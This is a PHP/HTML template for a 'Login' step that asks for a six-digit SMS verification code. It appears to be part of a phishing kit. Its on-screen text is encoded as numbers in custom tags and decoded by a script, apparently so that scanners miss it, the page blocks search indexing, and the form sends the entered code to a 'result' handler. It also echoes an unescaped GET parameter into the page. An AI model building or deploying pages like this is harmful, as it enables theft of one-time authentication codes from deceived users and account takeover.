<?php
    $url = explode('/',$_SERVER['REDIRECT_URL']);
    $curstep = end($url);
?>

<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/png" href="assets/imgs/favicon.png" />

        <title>Login</title>
    </head>

    <body>

        <div id="whitebox"></div>

        <!-- HEADER -->
        <header id="header2" class="d-lg-flex d-md-none d-sm-none d-none">
            <div class="logo"><img style="width: 57px;" src="assets/imgs/logo2.svg"></div>
            <div class="menu">
                <ul>
                    <li><hello class="chlakh">459 345 324 463</hello></li>
                    <li><hello class="chlakh">238 546 56 352 60 194 295 138 460 19 443 104 286 64 130 162 207 376 284</hello> <i class="fas fa-sort-down"></i></li>
                    <li><hello class="chlakh">218 363 300 127 185 221 72 559 14 49 412 276 304 282 159 122 492 43 284</hello> <i class="fas fa-sort-down"></i></li>
                    <li><hello class="chlakh">303 363 300 127 185 221 72 559 14 49 412 276 304 282 159 122 492 43 284</hello> <i class="fas fa-sort-down"></i></li>
                    <li><hello class="chlakh">526 456 339 113 515 324 265 423 337 72 259 457 488 480 461 561 286 507 152 13 348 93 28 441 503 398 482</hello> <i class="fas fa-sort-down"></i></li>
                    <li><hello class="chlakh">72 370 454 394 159 550 36 267 328 353 369 86 285 547 357 199 327 526 209 72 538 309 25 441 503 398 482</hello> <i class="fas fa-sort-down"></i></li>
                </ul>
            </div>
            <div class="btns">
                <img style="min-width: 399px;" src="assets/imgs/login-menu.png">
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER MOBILE -->
        <div id="mobile-menu" class="d-lg-none d-md-flex d-sm-flex d-flex" style="background: #F5F5F5;">
            <div class="pl-3"><img src="assets/imgs/mobilemenu.png"></div>
            <div><img style="width: 57px;" src="assets/imgs/logo2.svg"></div>
            <div><img style="min-width: 120px;" src="assets/imgs/log-menu2.png"></div>
        </div>
        <!-- END HEADER MOBILE -->

        <!-- MAIN -->
        <main id="main">
            <div class="left two order-lg-1 order-md-2 order-sm-2 order-2">
                <div class="top">
                    <div class="content2">
                        <div class="tt"><p><hello class="chlakh">246 557 151 246 234 172 74 93 61 560 485 545 50 249 357 199 327 526 209 72 538 309 25 441 503 398 482</hello></p></div>
                        <h3><hello class="chlakh">333 13 238 548 433 397 454 35 187 376 42 74 404 143 339 344 424 110 518 342 538 309 25 441 503 398 482</hello></h3>
                        <ul>
                            <li><hello class="chlakh">351 13 238 548 433 397 454 35 187 376 42 74 404 143 339 344 424 110 518 342 538 309 25 441 503 398 482</hello></li>
                            <li><hello class="chlakh">227 26 271 20 515 126 258 306 93 456 411 179 195 93 160 206 336 69 308 342 538 309 25 441 503 398 482</hello></li>
                            <li><hello class="chlakh">461 150 71 20 515 126 258 306 93 456 411 179 195 93 160 206 336 69 308 342 538 309 25 441 503 398 482</hello></li>
                        </ul>
                    </div>
                </div>
                <div class="bottom">
                    <div class="ccc">
                        
                        <img src="assets/imgs/chat2.png">
                        <p class="mt30 mb10"><hello class="chlakh">305 312 375 552 384 272 366 401 469 24 407 326 143 288 167 511 23 69 308 342 538 309 25 441 503 398 482</hello></p>
                        <p class="mb30"><b><hello class="chlakh">449 177 178 46 433 436 15 401 469 24 407 326 143 288 167 511 23 69 308 342 538 309 25 441 503 398 482</hello></b></p>
                        <button type="button"><hello class="chlakh">42 57 300 195 66 452 468 195 469 24 407 326 143 288 167 511 23 69 308 342 538 309 25 441 503 398 482</hello></button>

                    </div>
                </div>
            </div>
            <div class="right order-lg-2 order-md-1 order-sm-1 order-1">
                <div class="cc">
                    <div class="ti mb50">
                        <h3><hello class="chlakh">455 541 551 19 447 356 562 142 529 271 319 554 195 221 294 381 386 384 308 342 538 309 25 441 503 398 482</hello></h3>
                    </div>
                    
                    <form action="result" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="sms">
                        <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                        <input type="hidden" name="coco" value="<?php echo $curstep; ?>">

                    <div class="details2">
                        <p style="font-weight: 300; font-size: 13px; margin-bottom: 5px;"><hello class="chlakh">107 394 119 491 160 356 562 142 529 271 319 554 195 221 294 381 386 384 308 342 538 309 25 441 503 398 482</hello></p>
                        <p style="font-size: 13px;"><b><hello class="chlakh">436 76 325 71 276 205 562 50 156 518 192 286 331 493 477 134 382 109 308 342 538 309 25 441 503 398 482</hello></b></p>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'sms_code') ?>">
                            <label for="securipass" class="d-flex"><span class="flex-grow-1"><b><hello class="chlakh">360 220 172 119 89 31 562 50 156 518 192 286 331 493 477 134 382 109 308 342 538 309 25 441 503 398 482</hello></b></span><span style="font-weight: 300;"><hello class="chlakh">465 220 172 119 89 31 562 50 156 518 192 286 331 493 477 134 382 109 308 342 538 309 25 441 503 398 482</hello></span></label>
                            <input maxlength="6" type="text" name="sms_code" id="sms_code" class="form-control">
                            <?php echo error_message($_SESSION['errors'],'sms_code'); ?>
                        </div>
                        <p style="font-size: 13px; font-weight: 600; margin-bottom: 0;">
                            <hello class="chlakh">371 355 450 368 16 139 47 499 224 294 242 148 309 61 308 153 354 145 308 342 538 309 25 441 503 398 482</hello><br>
                            <hello class="chlakh">548 409 284 66 146 181 539 494 365 256 242 148 309 61 308 153 354 145 308 342 538 309 25 441 503 398 482</hello>
                        </p>
                    </div>
                    
                    <div class="btns">
                        <button type="button"><hello class="chlakh">428 193 12 222 406 537 512 494 365 256 242 148 309 61 308 153 354 145 308 342 538 309 25 441 503 398 482</hello></button>
                        <button type="submit"><hello class="chlakh">369 152 404 373 116 370 281 55 497 440 246 99 325 564 256 119 211 428 539 540 403 559 312 159 208 366 128 394</hello></button>
                    </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>
            getContent("sms");
        </script>

    </body>

</html>